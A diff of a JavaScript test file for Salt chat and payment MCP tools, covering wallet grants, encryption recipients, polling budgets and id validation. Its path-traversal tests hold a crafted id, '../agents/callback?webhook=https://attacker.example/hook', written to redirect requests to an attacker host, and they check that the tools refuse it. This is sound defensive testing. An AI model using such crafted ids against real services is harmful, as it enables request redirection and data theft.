@@ -8,6 +8,12 @@
 // openpgp keypairs for each chat member and actually decrypts the
 // ciphertext salt-mcp produced, rather than asserting on a mocked
 // "encrypted" string.
+//
+// Every Salt-record id fixture below is a real uuid shape -- deliberately,
+// since src/keyless-tools.mjs's assertPlainId now refuses anything else
+// (a 2026-09-18 security review found un-validated ids letting a crafted
+// `card_id` redirect an outbound request to an unrelated salt-api
+// endpoint; see the dedicated "id validation" section near the bottom).
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
@@ -24,6 +30,18 @@ import { SaltBearerApiError } from "../src/salt-bearer-client.mjs";
 import { CARD_UI_RESOURCE_URI } from "../src/card-ui.mjs";
 
 const { generateKeypair, decrypt } = pkg;
+
+const CHAT_ID = "11111111-1111-1111-1111-111111111111";
+const CARD_ID = "22222222-2222-2222-2222-222222222222";
+const CARD_ID_2 = "33333333-3333-3333-3333-333333333333";
+const RECEIVER_ID = "44444444-4444-4444-4444-444444444444";
+const REQUEST_ID = "55555555-5555-5555-5555-555555555555";
+const SELLER_ID = "66666666-6666-6666-6666-666666666666";
+const HUMAN_ID = "77777777-7777-7777-7777-777777777777";
+const WALLET_ID = "88888888-8888-8888-8888-888888888888";
+
+/** A grant carrying one wallet on ethereum mainnet -- the shape src/http.mjs's token validation fetches from GET /api/v1/oauth2/grant. */
+const ETH_GRANT = { scopes: ["chat", "money"], wallets: [{ id: WALLET_ID, chain: "ethereum", testnet: false, label: "Main" }] };
 
 function toolNamed(name) {
   const tool = KEYLESS_TOOLS.find((t) => t.name === name);
@@ -113,6 +131,14 @@ test("toKeylessMcpTools attaches name/description/inputSchema/annotations to eve
   }
 });
 
+test("no money tool's inputSchema or description proposes a wallet of the agent's own -- every one requires `chain` and reads from the grant", () => {
+  for (const name of ["request_payment", "send_invoice", "create_product"]) {
+    const tool = toolNamed(name);
+    assert.ok(tool.inputSchema.required.includes("chain"), `${name} should require chain`);
+    assert.doesNotMatch(tool.description, /this agent's own wallet|its own wallet|provision.*wallet/i, name);
+  }
+});
+
 // --- request shapes: each tool calls the rest client with the right args ---
 
 test("find_people_and_agents merges contacts and directory matches, deduped, capped at 20", async () => {
@@ -120,13 +146,13 @@ test("find_people_and_agents merges contacts and directory matches, deduped, cap
   const rest = {
     async searchContacts(token, q) {
       calls.push(["searchContacts", token, q]);
-      return [{ id: "u1", username: "ada", display_name: "Ada", account_type: "User" }];
+      return [{ id: RECEIVER_ID, username: "ada", display_name: "Ada", account_type: "User" }];
     },
     async listAgentsDirectory(token) {
       calls.push(["listAgentsDirectory", token]);
       return [
-        { id: "a1", username: "faucet-ada", display_name: "Faucet Ada", account_type: "Agent" },
-        { id: "a2", username: "other", display_name: "Other", account_type: "Agent" },
+        { id: "a1111111-1111-1111-1111-111111111111", username: "faucet-ada", display_name: "Faucet Ada", account_type: "Agent" },
+        { id: "a2222222-2222-2222-2222-222222222222", username: "other", display_name: "Other", account_type: "Agent" },
       ];
     },
   };
@@ -134,9 +160,9 @@ test("find_people_and_agents merges contacts and directory matches, deduped, cap
   assert.deepEqual(calls[0], ["searchContacts", "tok", "ada"]);
   assert.equal(calls[1][0], "listAgentsDirectory");
   assert.equal(result.results.length, 2, "the human contact plus the one agent matching 'ada'");
-  assert.ok(result.results.some((r) => r.id === "u1"));
-  assert.ok(result.results.some((r) => r.id === "a1"));
-  assert.ok(!result.results.some((r) => r.id === "a2"));
+  assert.ok(result.results.some((r) => r.id === RECEIVER_ID));
+  assert.ok(result.results.some((r) => r.username === "faucet-ada"));
+  assert.ok(!result.results.some((r) => r.username === "other"));
 });
 
 test("open_chat resolves a handle against contacts, then the directory, then opens/reuses the chat", async () => {
@@ -145,16 +171,16 @@ test("open_chat resolves a handle against contacts, then the directory, then ope
       return [];
     },
     async listAgentsDirectory() {
-      return [{ id: "a1", username: "faucet", display_name: "Faucet", account_type: "Agent" }];
+      return [{ id: RECEIVER_ID, username: "faucet", display_name: "Faucet", account_type: "Agent" }];
     },
     async createOrGetChat(token, contactId) {
       assert.equal(token, "tok");
-      assert.equal(contactId, "a1");
-      return { id: "chat-1", name: null, session: { users: [{ id: "a1", username: "faucet", display_name: "Faucet", account_type: "Agent" }] } };
+      assert.equal(contactId, RECEIVER_ID);
+      return { id: CHAT_ID, name: null, session: { users: [{ id: RECEIVER_ID, username: "faucet", display_name: "Faucet", account_type: "Agent" }] } };
     },
   };
   const result = await runKeylessTool("open_chat", { handle: "@faucet" }, { rest, bearerToken: "tok" });
-  assert.equal(result.chat_id, "chat-1");
+  assert.equal(result.chat_id, CHAT_ID);
   assert.equal(result.members.length, 1);
 });
 
@@ -171,9 +197,9 @@ test("list_chats returns metadata only -- id, name, members, unread_count -- and
     async listChats() {
       return [
         {
-          id: "c1",
+          id: CHAT_ID,
           name: "Group",
-          users: [{ id: "u1", username: "ada", display_name: "Ada", account_type: "User" }],
+          users: [{ id: RECEIVER_ID, username: "ada", display_name: "Ada", account_type: "User" }],
           unread_count: 3,
           messages: [{ id: "m1", message: "some-ciphertext-should-never-appear" }],
         },
@@ -182,7 +208,7 @@ test("list_chats returns metadata only -- id, name, members, unread_count -- and
   };
   const result = await runKeylessTool("list_chats", {}, { rest, bearerToken: "tok" });
   assert.deepEqual(result.chats, [
-    { id: "c1", name: "Group", members: [{ id: "u1", username: "ada", display_name: "Ada", account_type: "User" }], unread_count: 3 },
+    { id: CHAT_ID, name: "Group", members: [{ id: RECEIVER_ID, username: "ada", display_name: "Ada", account_type: "User" }], unread_count: 3 },
   ]);
   assert.equal(JSON.stringify(result).includes("ciphertext"), false);
 });
@@ -191,61 +217,76 @@ test("post_card forwards blocks and text to the rest client and returns ids", as
   const rest = {
     async postCard(token, chatId, blocks, text) {
       assert.equal(token, "tok");
-      assert.equal(chatId, "chat-1");
+      assert.equal(chatId, CHAT_ID);
       assert.deepEqual(blocks, [{ type: "divider" }]);
       assert.equal(text, "hi");
-      return { resource_id: "card-1", id: "msg-1" };
+      return { resource_id: CARD_ID, id: "msg-1" };
     },
   };
-  const result = await runKeylessTool("post_card", { chat_id: "chat-1", blocks: [{ type: "divider" }], text: "hi" }, { rest, bearerToken: "tok" });
-  assert.equal(result.card_id, "card-1");
+  const result = await runKeylessTool("post_card", { chat_id: CHAT_ID, blocks: [{ type: "divider" }], text: "hi" }, { rest, bearerToken: "tok" });
+  assert.equal(result.card_id, CARD_ID);
   assert.equal(result.message_id, "msg-1");
 });
 
 test("update_card forwards card_id and blocks", async () => {
   const rest = {
     async updateCard(token, cardId, blocks) {
-      assert.equal(cardId, "card-1");
+      assert.equal(cardId, CARD_ID);
       assert.deepEqual(blocks, [{ type: "section", text: "updated" }]);
       return {};
     },
   };
-  const result = await runKeylessTool("update_card", { card_id: "card-1", blocks: [{ type: "section", text: "updated" }] }, { rest, bearerToken: "tok" });
-  assert.deepEqual(result, { updated: true, card_id: "card-1", blocks: [{ type: "section", text: "updated" }] });
+  const result = await runKeylessTool("update_card", { card_id: CARD_ID, blocks: [{ type: "section", text: "updated" }] }, { rest, bearerToken: "tok" });
+  assert.deepEqual(result, { updated: true, card_id: CARD_ID, blocks: [{ type: "section", text: "updated" }] });
 });
 
-test("request_payment resolves the payee by handle within the chat and uses the caller's own wallet", async () => {
+test("request_payment resolves the payee by handle within the chat and spends the wallet the grant attached for that chain", async () => {
   const rest = {
     async getChat() {
-      return { session: { users: [{ id: "u1", username: "bob", display_name: "Bob" }] } };
-    },
-    async listWallets() {
-      return [{ id: "w1", deleted_at: null }];
+      return { session: { users: [{ id: RECEIVER_ID, username: "bob", display_name: "Bob" }] } };
     },
     async createTransferRequest(token, params) {
-      assert.equal(params.chatId, "chat-1");
-      assert.equal(params.receiverId, "u1");
-      assert.equal(params.walletId, "w1");
+      assert.equal(params.chatId, CHAT_ID);
+      assert.equal(params.receiverId, RECEIVER_ID);
+      assert.equal(params.walletId, WALLET_ID);
       assert.equal(params.amount, "10.00");
-      return { id: "req-1", status: "Pending", amount: "10.00" };
+      return { id: REQUEST_ID, status: "Pending", amount: "10.00" };
     },
   };
-  const result = await runKeylessTool("request_payment", { chat_id: "chat-1", to: "bob", amount: "10.00" }, { rest, bearerToken: "tok" });
-  assert.deepEqual(result, { request_id: "req-1", status: "Pending", amount: "10.00" });
+  const result = await runKeylessTool(
+    "request_payment",
+    { chat_id: CHAT_ID, to: "bob", amount: "10.00", chain: "Ethereum" },
+    { rest, bearerToken: "tok", grant: ETH_GRANT }
+  );
+  assert.deepEqual(result, { request_id: REQUEST_ID, status: "Pending", amount: "10.00" });
 });
 
-test("request_payment refuses when the connection has no active wallet", async () => {
+test("request_payment refuses when the grant has no wallet for the requested chain, and NEVER reads /api/v1/wallets", async () => {
   const rest = {
     async getChat() {
-      return { session: { users: [{ id: "u1", username: "bob" }] } };
+      return { session: { users: [{ id: RECEIVER_ID, username: "bob" }] } };
     },
-    async listWallets() {
-      return [];
-    },
+    // Deliberately no listWallets on this mock at all -- if the tool tried
+    // to call it, the test would throw "rest.listWallets is not a
+    // function" rather than the expected refusal, catching a regression
+    // back to reading /api/v1/wallets.
   };
   await assert.rejects(
-    () => runKeylessTool("request_payment", { chat_id: "chat-1", to: "bob", amount: "1" }, { rest, bearerToken: "tok" }),
-    /no wallet to receive payments/
+    () => runKeylessTool("request_payment", { chat_id: CHAT_ID, to: "bob", amount: "1", chain: "base" }, { rest, bearerToken: "tok", grant: ETH_GRANT }),
+    /This connection can't receive payments on base\. The owner can add a wallet in Salt/
+  );
+});
+
+test("request_payment refuses on testnet even when a mainnet wallet for the same chain is granted", async () => {
+  const rest = { async getChat() { return { session: { users: [{ id: RECEIVER_ID, username: "bob" }] } }; } };
+  await assert.rejects(
+    () =>
+      runKeylessTool(
+        "request_payment",
+        { chat_id: CHAT_ID, to: "bob", amount: "1", chain: "ethereum", testnet: true },
+        { rest, bearerToken: "tok", grant: ETH_GRANT }
+      ),
+    /ethereum testnet/
   );
 });
 
@@ -253,78 +294,78 @@ test("send_invoice computes subtotal = qty x unit_price and amount = sum of subt
   let sentBody;
   const rest = {
     async getChat() {
-      return { session: { users: [{ id: "u2", username: "carol" }] } };
-    },
-    async listWallets() {
-      return [{ id: "w9", deleted_at: null }];
+      return { session: { users: [{ id: RECEIVER_ID, username: "carol" }] } };
     },
     async createTransferRequest(token, params) {
       sentBody = params;
-      return { id: "inv-1", status: "Pending" };
+      return { id: REQUEST_ID, status: "Pending" };
     },
   };
   const result = await runKeylessTool(
     "send_invoice",
     {
-      chat_id: "chat-1",
+      chat_id: CHAT_ID,
       to: "carol",
+      chain: "ethereum",
       line_items: [
         { name: "Widget", qty: 2, unit_price: 5 },
         { name: "Gadget", qty: 1, unit_price: 2.5 },
       ],
     },
-    { rest, bearerToken: "tok" }
+    { rest, bearerToken: "tok", grant: ETH_GRANT }
   );
   assert.equal(sentBody.requestType, "invoice");
+  assert.equal(sentBody.walletId, WALLET_ID);
   assert.equal(sentBody.lineItems[0].subtotal, "10");
   assert.equal(sentBody.lineItems[1].subtotal, "2.5");
   assert.equal(sentBody.amount, "12.5");
   assert.equal(result.amount, "12.5");
-  assert.equal(result.request_id, "inv-1");
+  assert.equal(result.request_id, REQUEST_ID);
 });
 
 test("get_payment_status finds the matching request by id from the index and refuses an unknown id", async () => {
   const rest = {
     async listTransferRequests() {
-      return [{ id: "req-1", status: "Confirmed", amount: "5", request_type: "request" }];
+      return [{ id: REQUEST_ID, status: "Confirmed", amount: "5", request_type: "request" }];
     },
   };
-  const found = await runKeylessTool("get_payment_status", { request_id: "req-1" }, { rest, bearerToken: "tok" });
+  const found = await runKeylessTool("get_payment_status", { request_id: REQUEST_ID }, { rest, bearerToken: "tok" });
   assert.equal(found.status, "Confirmed");
-  await assert.rejects(() => runKeylessTool("get_payment_status", { request_id: "nope" }, { rest, bearerToken: "tok" }), /No payment request found/);
+  await assert.rejects(
+    () => runKeylessTool("get_payment_status", { request_id: "99999999-0000-0000-0000-000000000000" }, { rest, bearerToken: "tok" }),
+    /No payment request found/
+  );
 });
 
-test("list_products / create_product / list_salt_agents pass through to the rest client", async () => {
+test("list_products / create_product / list_salt_agents pass through to the rest client, create_product spending the granted wallet", async () => {
   const rest = {
     async listProducts(token, sellerId) {
-      assert.equal(sellerId, "seller-1");
+      assert.equal(sellerId, SELLER_ID);
       return [{ id: "p1" }];
     },
-    async listWallets() {
-      return [{ id: "w1", deleted_at: null }];
-    },
     async createProduct(token, params) {
-      assert.equal(params.wallet_id, "w1");
+      assert.equal(params.wallet_id, WALLET_ID);
       assert.equal(params.title, "Coffee");
+      assert.equal("chain" in params, false, "chain/testnet are consumed for wallet resolution, never forwarded to salt-api");
       return { id: "p2" };
     },
     async listAgentsDirectory() {
-      return [{ id: "a1", username: "faucet", display_name: "Faucet", category: "utility" }];
+      return [{ id: RECEIVER_ID, username: "faucet", display_name: "Faucet", category: "utility" }];
     },
   };
-  assert.deepEqual(await runKeylessTool("list_products", { seller_id: "seller-1" }, { rest, bearerToken: "tok" }), { products: [{ id: "p1" }] });
-  assert.deepEqual(await runKeylessTool("create_product", { title: "Coffee", kind: "one_time", price: "3" }, { rest, bearerToken: "tok" }), {
-    created: true,
-    product: { id: "p2" },
-  });
+  assert.deepEqual(await runKeylessTool("list_products", { seller_id: SELLER_ID }, { rest, bearerToken: "tok" }), { products: [{ id: "p1" }] });
+  assert.deepEqual(
+    await runKeylessTool("create_product", { title: "Coffee", kind: "one_time", price: "3", chain: "ethereum" }, { rest, bearerToken: "tok", grant: ETH_GRANT }),
+    { created: true, product: { id: "p2" } }
+  );
   assert.deepEqual(await runKeylessTool("list_salt_agents", {}, { rest, bearerToken: "tok" }), {
-    agents: [{ id: "a1", username: "faucet", display_name: "Faucet", category: "utility" }],
+    agents: [{ id: RECEIVER_ID, username: "faucet", display_name: "Faucet", category: "utility" }],
   });
 });
 
 // --- send_message: real encryption, decrypted for real ---------------------
 
-test("send_message encrypts for every OTHER member's real public key, with no self-copy, and refuses a chat where a member has no key", async () => {
+test("send_message encrypts for every member's real public key -- including this connection's own agent row -- with no self-copy, and refuses a chat where a member has no key", async () => {
   const alice = await generateKeypair("alice-pass");
   const bob = await generateKeypair("bob-pass");
 
@@ -333,9 +374,8 @@ test("send_message encrypts for every OTHER member's real public key, with no se
       return {
         session: {
           users: [
-            { id: "agent-1", username: "myagent", public_key: null }, // the keyless agent itself -- irrelevant, has no key anyway
-            { id: "alice", username: "alice", display_name: "Alice", public_key: alice.publicKey },
-            { id: "bob", username: "bob", display_name: "Bob", public_key: bob.publicKey },
+            { id: "alice-0000-0000-0000-000000000000", username: "alice", display_name: "Alice", public_key: alice.publicKey },
+            { id: "bob-00000-0000-0000-000000000000", username: "bob", display_name: "Bob", public_key: bob.publicKey },
           ],
         },
       };
@@ -346,19 +386,7 @@ test("send_message encrypts for every OTHER member's real public key, with no se
     },
   };
 
-  // Sanity: a chat with a keyless member (no public_key at all, e.g. the
-  // agent's own row) must NOT block sending -- only an actual recipient
-  // missing a key should. Re-run with the agent excluded to isolate that.
-  rest.getChat = async () => ({
-    session: {
-      users: [
-        { id: "alice", username: "alice", display_name: "Alice", public_key: alice.publicKey },
-        { id: "bob", username: "bob", display_name: "Bob", public_key: bob.publicKey },
-      ],
-    },
-  });
-
-  const result = await runKeylessTool("send_message", { chat_id: "chat-1", text: "hello both" }, { rest, bearerToken: "tok" });
+  const result = await runKeylessTool("send_message", { chat_id: CHAT_ID, text: "hello both" }, { rest, bearerToken: "tok" });
   assert.equal(result.sent, true);
   assert.equal(result.message_id, "msg-1");
 
@@ -377,30 +405,36 @@ test("send_message refuses when any member has no public key on file", async () 
       return {
         session: {
           users: [
-            { id: "alice", username: "alice", display_name: "Alice", public_key: alice.publicKey },
-            { id: "dave", username: "dave", display_name: "Dave", public_key: null },
+            { id: "alice-0000-0000-0000-000000000000", username: "alice", display_name: "Alice", public_key: alice.publicKey },
+            { id: "dave-00000-0000-0000-000000000000", username: "dave", display_name: "Dave", public_key: null },
           ],
         },
       };
     },
   };
   await assert.rejects(
-    () => runKeylessTool("send_message", { chat_id: "chat-1", text: "hi" }, { rest, bearerToken: "tok" }),
+    () => runKeylessTool("send_message", { chat_id: CHAT_ID, text: "hi" }, { rest, bearerToken: "tok" }),
     /Dave hasn't set up an encryption key yet/
   );
 });
 
-test("send_message excludes silent observers from the recipient set", async () => {
+test("send_message INCLUDES a silent observer in the recipient set -- an owner observes a delegation chat precisely to audit it", async () => {
+  // A 2026-09-18 security review reversed this: an earlier version of
+  // sendMessage excluded observer=true members from encryption, which
+  // silently defeated the whole point of CLAUDE.md's "Delegation
+  // observability" feature (the owner is added as an observer BECAUSE
+  // they should be able to read what happened). Every member with a key
+  // gets the ciphertext now, full stop -- observer or not.
   const alice = await generateKeypair("alice-pass");
-  const observer = await generateKeypair("observer-pass");
+  const observerOwner = await generateKeypair("observer-pass");
   let ciphertext;
   const rest = {
     async getChat() {
       return {
         session: {
           users: [
-            { id: "alice", username: "alice", public_key: alice.publicKey },
-            { id: "obs", username: "root_owner", public_key: observer.publicKey, observer: true },
+            { id: "alice-0000-0000-0000-000000000000", username: "alice", public_key: alice.publicKey },
+            { id: "owner-0000-0000-0000-000000000000", username: "root_owner", public_key: observerOwner.publicKey, observer: true },
           ],
         },
       };
@@ -410,10 +444,58 @@ test("send_message excludes silent observers from the recipient set", async () =
       return { id: "m1" };
     },
   };
-  await runKeylessTool("send_message", { chat_id: "chat-1", text: "secret-ish" }, { rest, bearerToken: "tok" });
-  await assert.rejects(() => decrypt(ciphertext, observer.privateKey, "observer-pass"), /Error decrypting message/i);
+  await runKeylessTool("send_message", { chat_id: CHAT_ID, text: "auditable" }, { rest, bearerToken: "tok" });
   const readByAlice = await decrypt(ciphertext, alice.privateKey, "alice-pass");
-  assert.equal(readByAlice, "secret-ish");
+  const readByObserver = await decrypt(ciphertext, observerOwner.privateKey, "observer-pass");
+  assert.equal(readByAlice, "auditable");
+  assert.equal(readByObserver, "auditable", "the observing owner can decrypt too -- that's the audit trail working");
+});
+
+// --- id validation at the tool boundary (path-traversal hardening) --------
+
+test("update_card refuses a card_id crafted to redirect the outbound request to a different salt-api endpoint", async () => {
+  const rest = {
+    async updateCard() {
+      throw new Error("updateCard should never have been called -- assertPlainId must refuse first");
+    },
+  };
+  await assert.rejects(
+    () =>
+      runKeylessTool(
+        "update_card",
+        { card_id: "../agents/callback?webhook=https://attacker.example/hook", blocks: [{ type: "divider" }] },
+        { rest, bearerToken: "tok" }
+      ),
+    /card_id must be a plain Salt id/
+  );
+});
+
+test("id validation refuses a non-plain id on every id-shaped argument, not just card_id", async () => {
+  const hostile = "../agents/callback?webhook=https://attacker.example/hook";
+  const rest = {}; // never reached -- validation must throw first in every case below
+  await assert.rejects(() => runKeylessTool("send_message", { chat_id: hostile, text: "hi" }, { rest, bearerToken: "tok" }), /chat_id must be a plain Salt id/);
+  await assert.rejects(() => runKeylessTool("post_card", { chat_id: hostile, blocks: [{ type: "divider" }] }, { rest, bearerToken: "tok" }), /chat_id must be a plain Salt id/);
+  await assert.rejects(() => runKeylessTool("get_payment_status", { request_id: hostile }, { rest, bearerToken: "tok" }), /request_id must be a plain Salt id/);
+  await assert.rejects(
+    () => runKeylessTool("ask_human", { chat_id: hostile, to: "dan", question: "Q?", options: ["A", "B"] }, { rest, bearerToken: "tok" }),
+    /chat_id must be a plain Salt id/
+  );
+  await assert.rejects(
+    () => runKeylessTool("list_products", { seller_id: hostile }, { rest, bearerToken: "tok" }),
+    /seller_id must be a plain Salt id/
+  );
+});
+
+test("id validation accepts both uuid and plain-integer ids", async () => {
+  const rest = {
+    async listTransferRequests() {
+      return [{ id: "42", status: "Confirmed", amount: "1" }];
+    },
+  };
+  const byInteger = await runKeylessTool("get_payment_status", { request_id: "42" }, { rest, bearerToken: "tok" });
+  assert.equal(byInteger.status, "Confirmed");
+  const byUuid = await runKeylessTool("get_payment_status", { request_id: REQUEST_ID }, { rest: { async listTransferRequests() { return [{ id: REQUEST_ID, status: "Pending", amount: "1" }]; } }, bearerToken: "tok" });
+  assert.equal(byUuid.status, "Pending");
 });
 
 // --- scope refusal ----------------------------------------------------------
@@ -425,7 +507,7 @@ test("a salt-api 403 on a money tool becomes the exact plain-sentence scope refu
     },
   };
   await assert.rejects(
-    () => runKeylessTool("get_payment_status", { request_id: "x" }, { rest, bearerToken: "tok" }),
+    () => runKeylessTool("get_payment_status", { request_id: REQUEST_ID }, { rest, bearerToken: "tok" }),
     /This connection wasn't given permission to request money\./
   );
 });
@@ -456,21 +538,27 @@ test("runKeylessTool refuses an unknown tool name", async () => {
 });
 
 // --- ask_human / get_ask_result: resolution, restriction, and timeout ------
+//
+// `maxTotalMsOverride` below rides in the OPTIONS object (this test file's
+// own `runKeylessTool(name, args, {...})` third argument), never in
+// `args`/`input` -- exactly the boundary that keeps a real MCP client from
+// ever setting it (src/http.mjs's one real call site never populates it).
+// See keyless-tools.mjs's runKeylessTool doc comment.
 
 test("ask_human posts a card with one restricted_to button per option, then resolves the matching tap", async () => {
   let postedBlocks;
   const rest = {
     async getChat() {
-      return { session: { users: [{ id: "human-1", username: "dan", display_name: "Dan" }] } };
+      return { session: { users: [{ id: HUMAN_ID, username: "dan", display_name: "Dan" }] } };
     },
     async postCard(token, chatId, blocks) {
       postedBlocks = blocks;
-      return { resource_id: "card-42" };
+      return { resource_id: CARD_ID };
     },
     async agentUpdates() {
       return {
         updates: [
-          { id: 5, event: "card_interaction", body: JSON.stringify({ card_id: "card-42", action_id: "opt_1", value: "", user: { id: "human-1" } }) },
+          { id: 5, event: "card_interaction", body: JSON.stringify({ card_id: CARD_ID, action_id: "opt_1", value: "", user: { id: HUMAN_ID } }) },
         ],
         cursor: 5,
       };
@@ -478,35 +566,35 @@ test("ask_human posts a card with one restricted_to button per option, then reso
   };
   const result = await runKeylessTool(
     "ask_human",
-    { chat_id: "chat-1", to: "dan", question: "Pineapple on pizza?", options: ["Yes", "No"], _maxTotalMs: 20 },
-    { rest, bearerToken: "tok" }
+    { chat_id: CHAT_ID, to: "dan", question: "Pineapple on pizza?", options: ["Yes", "No"] },
+    { rest, bearerToken: "tok", maxTotalMsOverride: 20 }
   );
   const actionsBlock = postedBlocks.find((b) => b.type === "actions");
   assert.equal(actionsBlock.elements.length, 2);
-  assert.deepEqual(actionsBlock.elements[0].restricted_to, ["human-1"]);
+  assert.deepEqual(actionsBlock.elements[0].restricted_to, [HUMAN_ID]);
   assert.equal(result.answer, "No", "opt_1 maps to the second option, 'No'");
   assert.equal(typeof result.ask_id, "string");
 });
 
-test("ask_human ignores a card_interaction for a different card_id and one from the wrong action_id namespace", async () => {
+test("ask_human ignores a card_interaction for a different card_id", async () => {
   const rest = {
     async getChat() {
-      return { session: { users: [{ id: "human-1", username: "dan" }] } };
+      return { session: { users: [{ id: HUMAN_ID, username: "dan" }] } };
     },
     async postCard() {
-      return { resource_id: "card-42" };
+      return { resource_id: CARD_ID };
     },
     async agentUpdates() {
       return {
-        updates: [{ id: 1, event: "card_interaction", body: JSON.stringify({ card_id: "some-other-card", action_id: "opt_0" }) }],
+        updates: [{ id: 1, event: "card_interaction", body: JSON.stringify({ card_id: CARD_ID_2, action_id: "opt_0" }) }],
         cursor: 1,
       };
     },
   };
   const result = await runKeylessTool(
     "ask_human",
-    { chat_id: "chat-1", to: "dan", question: "Q?", options: ["A", "B"], _maxTotalMs: 15 },
-    { rest, bearerToken: "tok" }
+    { chat_id: CHAT_ID, to: "dan", question: "Q?", options: ["A", "B"] },
+    { rest, bearerToken: "tok", maxTotalMsOverride: 15 }
   );
   assert.equal(result.status, "pending");
   assert.equal(result.answer, undefined);
@@ -515,10 +603,10 @@ test("ask_human ignores a card_interaction for a different card_id and one from 
 test("ask_human returns {status: 'pending', ask_id} when nobody has answered within its time budget", async () => {
   const rest = {
     async getChat() {
-      return { session: { users: [{ id: "human-1", username: "dan" }] } };
+      return { session: { users: [{ id: HUMAN_ID, username: "dan" }] } };
     },
     async postCard() {
-      return { resource_id: "card-1" };
+      return { resource_id: CARD_ID };
     },
     async agentUpdates() {
       return { updates: [], cursor: 0 };
@@ -526,25 +614,62 @@ test("ask_human returns {status: 'pending', ask_id} when nobody has answered wit
   };
   const result = await runKeylessTool(
     "ask_human",
-    { chat_id: "chat-1", to: "dan", question: "Q?", options: ["A", "B"], _maxTotalMs: 10 },
-    { rest, bearerToken: "tok" }
+    { chat_id: CHAT_ID, to: "dan", question: "Q?", options: ["A", "B"] },
+    { rest, bearerToken: "tok", maxTotalMsOverride: 10 }
   );
   assert.deepEqual(Object.keys(result).sort(), ["ask_id", "status"]);
   assert.equal(result.status, "pending");
 });
 
+test("ask_human's polling budget cannot be set from tool arguments -- only from the internal options object", async () => {
+  // Passing `_maxTotalMs` (or any name) inside `args` must be a no-op: it
+  // is not in ask_human's inputSchema and nothing reads it off `input`.
+  // This proves the fix, not just the absence of the old field: with NO
+  // maxTotalMsOverride at all, the real ~50s production budget is what's
+  // in effect, so a mock that answers on the FIRST poll still resolves
+  // immediately (the loop simply never needs a second iteration) -- but a
+  // wire-supplied override asking for an instant timeout is ignored.
+  let pollCount = 0;
+  const rest = {
+    async getChat() {
+      return { session: { users: [{ id: HUMAN_ID, username: "dan" }] } };
+    },
+    async postCard() {
+      return { resource_id: CARD_ID };
+    },
+    async agentUpdates() {
+      pollCount += 1;
+      // Answers on the very first poll -- so this resolves fast
+      // regardless of the (huge, real) production budget, proving the
+      // request-shaped `_maxTotalMs` argument below did nothing rather
+      // than shrinking the budget to something suspiciously small.
+      return {
+        updates: [{ id: 1, event: "card_interaction", body: JSON.stringify({ card_id: CARD_ID, action_id: "opt_0" }) }],
+        cursor: 1,
+      };
+    },
+  };
+  const result = await runKeylessTool(
+    "ask_human",
+    { chat_id: CHAT_ID, to: "dan", question: "Q?", options: ["A", "B"], _maxTotalMs: 999999999 },
+    { rest, bearerToken: "tok" } // no maxTotalMsOverride -- the real ~50s cap applies
+  );
+  assert.equal(result.answer, "A");
+  assert.equal(pollCount, 1);
+});
+
 test("ask_human refuses a `to` handle that isn't a member of the chat", async () => {
-  const rest = { async getChat() { return { session: { users: [{ id: "u1", username: "someoneelse" }] } }; } };
+  const rest = { async getChat() { return { session: { users: [{ id: RECEIVER_ID, username: "someoneelse" }] } }; } };
   await assert.rejects(
-    () => runKeylessTool("ask_human", { chat_id: "c1", to: "dan", question: "Q?", options: ["A", "B"] }, { rest, bearerToken: "tok" }),
+    () => runKeylessTool("ask_human", { chat_id: CHAT_ID, to: "dan", question: "Q?", options: ["A", "B"] }, { rest, bearerToken: "tok" }),
     /dan isn't in this chat/
   );
 });
 
 test("ask_human requires 2..5 options", async () => {
-  const rest = { async getChat() { return { session: { users: [{ id: "u1", username: "dan" }] } }; } };
+  const rest = { async getChat() { return { session: { users: [{ id: HUMAN_ID, username: "dan" }] } }; } };
   await assert.rejects(
-    () => runKeylessTool("ask_human", { chat_id: "c1", to: "dan", question: "Q?", options: ["only one"] }, { rest, bearerToken: "tok" }),
+    () => runKeylessTool("ask_human", { chat_id: CHAT_ID, to: "dan", question: "Q?", options: ["only one"] }, { rest, bearerToken: "tok" }),
     /2\.\.5 choices/
   );
 });
@@ -552,26 +677,21 @@ test("ask_human requires 2..5 options", async () => {
 test("get_ask_result resumes from a pending ask_id and resolves once the tap lands", async () => {
   const pendingAsk = await runKeylessTool(
     "ask_human",
-    {
-      chat_id: "chat-1",
-      to: "dan",
-      question: "Q?",
-      options: ["Yes", "No"],
-      _maxTotalMs: 5,
-    },
+    { chat_id: CHAT_ID, to: "dan", question: "Q?", options: ["Yes", "No"] },
     {
       rest: {
         async getChat() {
-          return { session: { users: [{ id: "human-1", username: "dan" }] } };
+          return { session: { users: [{ id: HUMAN_ID, username: "dan" }] } };
         },
         async postCard() {
-          return { resource_id: "card-9" };
+          return { resource_id: CARD_ID };
         },
         async agentUpdates() {
           return { updates: [], cursor: 3 };
         },
       },
       bearerToken: "tok",
+      maxTotalMsOverride: 5,
     }
   );
   assert.equal(pendingAsk.status, "pending");
@@ -580,7 +700,7 @@ test("get_ask_result resumes from a pending ask_id and resolves once the tap lan
     async agentUpdates(token, { after }) {
       assert.equal(after, 3, "get_ask_result resumes from the cursor the pending ask left off at");
       return {
-        updates: [{ id: 4, event: "card_interaction", body: JSON.stringify({ card_id: "card-9", action_id: "opt_0" }) }],
+        updates: [{ id: 4, event: "card_interaction", body: JSON.stringify({ card_id: CARD_ID, action_id: "opt_0" }) }],
         cursor: 4,
       };
     },
@@ -593,10 +713,63 @@ test("get_ask_result refuses a malformed ask_id", async () => {
   await assert.rejects(() => runKeylessTool("get_ask_result", { ask_id: "not-base64-json" }, { rest: {}, bearerToken: "tok" }), /isn't valid or has expired/);
 });
 
+test("get_ask_result's polling budget also cannot be set from tool arguments", async () => {
+  const pendingAsk = await runKeylessTool(
+    "ask_human",
+    { chat_id: CHAT_ID, to: "dan", question: "Q?", options: ["Yes", "No"] },
+    {
+      rest: {
+        async getChat() { return { session: { users: [{ id: HUMAN_ID, username: "dan" }] } }; },
+        async postCard() { return { resource_id: CARD_ID }; },
+        async agentUpdates() { return { updates: [], cursor: 1 }; },
+      },
+      bearerToken: "tok",
+      maxTotalMsOverride: 5,
+    }
+  );
+  let pollCount = 0;
+  const rest = {
+    async agentUpdates() {
+      pollCount += 1;
+      return { updates: [{ id: 2, event: "card_interaction", body: JSON.stringify({ card_id: CARD_ID, action_id: "opt_1" }) }], cursor: 2 };
+    },
+  };
+  const result = await runKeylessTool("get_ask_result", { ask_id: pendingAsk.ask_id, _maxTotalMs: 999999999 }, { rest, bearerToken: "tok" });
+  assert.equal(result.answer, "No");
+  assert.equal(pollCount, 1);
+});
+
+// --- pollForCardInteraction: signal/abort and budget -----------------------
+
